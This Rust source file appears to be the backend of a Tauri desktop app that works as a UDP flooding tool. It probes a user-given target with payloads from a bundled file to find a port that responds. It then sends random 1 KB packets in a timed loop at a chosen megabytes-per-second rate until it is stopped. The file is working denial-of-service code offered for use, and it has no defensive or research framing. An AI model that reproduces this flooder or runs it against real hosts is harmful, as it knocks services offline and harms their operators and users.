use std::{
    net::UdpSocket,
    sync::Mutex,
    thread::{self},
    time::{Duration, Instant},
};

use payload::Payload;
use rand::Rng;
use serde::Deserialize;
use serde_json::Value;
use states::AppState;
use tauri::State;

mod console;
mod payload;
mod states;

// make getters and setters async because mutex's lock() blocks threads
#[tauri::command]
async fn get_send_packets(state: State<'_, Mutex<AppState>>) -> Result<bool, ()> {
    let state = state.lock().unwrap();
    Ok(state.send_packets)
}

#[tauri::command]
async fn set_send_packets(state: State<'_, Mutex<AppState>>, value: bool) -> Result<(), ()> {
    let mut state = state.lock().unwrap();
    state.send_packets = value;
    Ok(())
}

#[tauri::command]
async fn send_packets(
    state: State<'_, Mutex<AppState>>,
    target_address: String,
    port: Option<String>,
    data_size: usize,
) -> Result<(), ()> {
    console::spawn_console();

    let socket = UdpSocket::bind("0.0.0.0:0").unwrap();

    socket
        .set_read_timeout(Some(Duration::from_secs(1)))
        .unwrap();

    let payloads = serde_json::from_str::<Value>(
        String::from_utf8_lossy(include_bytes!("../payloads.json"))
            .to_string()
            .as_str(),
    )
    .expect("incorrect payloads.json file format")
    .as_array()
    .expect("payloads must be provided in an array")
    .iter()
    .map(|value| {
        Payload::deserialize(value.clone()).expect("payload must have packet and port fields")
    })
    .collect::<Vec<Payload>>();

    let port: String = match port {
        Some(value) => value,
        None => {
            let mut free_port: Option<String> = None;
            let mut _buffer: [u8; 4096] = [0; 4096];

            for (attempt, payload) in payloads.iter().enumerate() {
                {
                    let state = state.lock().unwrap();

                    if !state.send_packets {
                        println!("stopping...");
                        break;
                    }
                }
                println!("scanning for free ports - attempt [{}]", attempt);
                println!("{payload:?}\n");

                let address = target_address.clone() + ":" + payload.port.to_string().as_str();

                if let Ok(_bytes_written) = socket.send_to(&payload.packet, &address) {
                    // after sending the packet, wait for response
                    if let Ok((_bytes_written, socket_address)) = socket.recv_from(&mut _buffer) {
                        if socket_address.to_string() == address {
                            println!("found free port on: {}", payload.port);

                            free_port = Some(payload.port.to_string());
                            break;
                        }
                    }
                }
            }
            if let None = free_port {
                println!("no free ports available");
                return Ok(());
            }

            free_port.unwrap()
        }
    };

    let target_address = target_address + ":" + port.as_str();
    // 1 kb packet
    let mut packet: [u8; 1024] = [0; 1024];
    let mut rng = rand::rng();
    // convert to mb to kb
    let iterations = data_size * 1024;
    let mut iteration_start;
    let remaining_time = Duration::new(1, 0);

    loop {
        iteration_start = Instant::now();
        packet.fill_with(|| (&mut rng).random::<u8>());

        {
            let state = state.lock().unwrap();

            if !state.send_packets {
                println!("stopping...");
                break;
            }
        }

        for _ in (0 as usize)..iterations {
            match (&socket).send_to(&packet, &target_address) {
                Ok(_bytes_written) => (),
                Err(error) => println!("failed sending bytes: {}", error),
            }
        }

        println!(
            "succesfully sent {} mb in {:?}",
            &data_size,
            iteration_start.elapsed()
        );
        thread::sleep((&remaining_time).saturating_sub(iteration_start.elapsed()));
    }

    Ok(())
}

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    tauri::Builder::default()
        .manage(Mutex::new(AppState::default()))
        .plugin(tauri_plugin_opener::init())
        .invoke_handler(tauri::generate_handler![
            get_send_packets,
            set_send_packets,
            send_packets
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
